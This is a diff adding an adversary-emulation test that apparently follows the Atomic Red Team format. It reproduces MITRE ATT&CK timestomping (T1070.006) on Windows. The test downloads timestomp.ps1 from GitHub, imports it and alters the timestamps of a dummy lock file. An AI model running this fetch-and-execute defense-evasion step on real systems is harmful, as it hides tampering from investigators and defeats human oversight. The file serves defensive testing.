@@ -1,0 +1,39 @@
+api_version: "2.0"
+name: Windows - Timestomp a File
+description: "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n"
+args:
+    - name: file_path
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads
+uuid: d7512c33-3a75-4806-9893-69abc3ccdd43
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1070: Indicator Removal'
+    subtechniques:
+        - 'T1070.006: Timestomp'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        timestomp.ps1 must be present in #{file_path}.
+      inline: |
+        if (Test-Path "#{file_path}\timestomp.ps1") {exit 0} else {{Invoke-WebRequest "https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1" -OutFile "#{file_path}\timestomp.ps1"
+        }}
+      executor: powershell
+    - name: |
+        kxwn.lock must be present in #{file_path}.
+      inline: |
+        if (Test-Path -path "#{file_path}\kxwn.lock") {exit 0} else {{New-Item -Path "#{file_path}\kxwn.lock" -ItemType File
+        }}
+      executor: powershell
+    - name: windows---timestomp-a-file
+      inline: |
+        import-module "{{.Args.file_path}}\timestomp.ps1"
+        timestomp -dest "{{.Args.file_path}}\kxwn.lock"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
